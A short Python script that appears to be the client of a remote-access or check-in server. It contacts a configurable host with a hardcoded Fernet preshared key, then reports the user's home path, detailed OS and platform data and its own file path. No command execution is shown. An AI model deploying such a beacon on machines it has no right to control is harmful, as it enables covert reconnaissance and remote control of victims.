import time, json, socket, os, sys, platform
from cryptography.fernet import Fernet
from inspect import getsourcefile
from os.path import abspath


host = "127.0.0.1"
checkinport = 1024 #default "checkin" port
encryption = False #An ecryption key will be generated in the handshake? [True/False]
presharedencryption = b'ts1UOpWUIE-PFmHE-HWhVWKS5YPrfSQzHjwFm7wnCIQ=' #set to whatever PRESHARED encryption key
authcode = "" #set if you have set password authentication on the host
refrence = "" #will set a text value in the client connection table

def connect(connectionstring):
    time.sleep(2)
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as serversocket:
        serversocket.connect((connectionstring['host'], connectionstring['port']))
        if presharedencryption == "":
            serversocket.sendall(bytes(json.dumps({"user": os.path.expanduser('~'), "os": f'{sys.platform}|{platform.platform()}|{platform.release()}|{platform.version()}|{platform.machine()}|{sys.version}', "path": abspath(getsourcefile(lambda:0))}),encoding="utf-8"))
        else:
            tosend = Fernet(presharedencryption).encrypt(bytes(json.dumps({"user": os.path.expanduser('~'), "os": f'{sys.platform}|{platform.platform()}|{platform.release()}|{platform.version()}|{platform.machine()}|{sys.version}', "path": abspath(getsourcefile(lambda:0))}),encoding="utf-8"))
            serversocket.sendall(tosend)

def initconnection():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as serversocket:
        serversocket.connect((host, checkinport))
        if presharedencryption == "":
            serversocket.sendall(bytes(json.dumps({"refrence": refrence, "client": False, "auth": authcode, "encrypt": encryption}),encoding="utf-8"))
        else:
            tosend = Fernet(presharedencryption).encrypt(bytes(json.dumps({"refrence": refrence, "client": False, "auth": authcode, "encrypt": encryption}),encoding="utf-8"))
            serversocket.sendall(tosend)
        recieveddata = serversocket.recv(checkinport)
        try:
            data = json.loads(recieveddata.decode("utf-8"))
        except:
            data = json.loads(Fernet(presharedencryption).decrypt(recieveddata).decode("utf-8"))
        print(data)
        connect(data)

initconnection()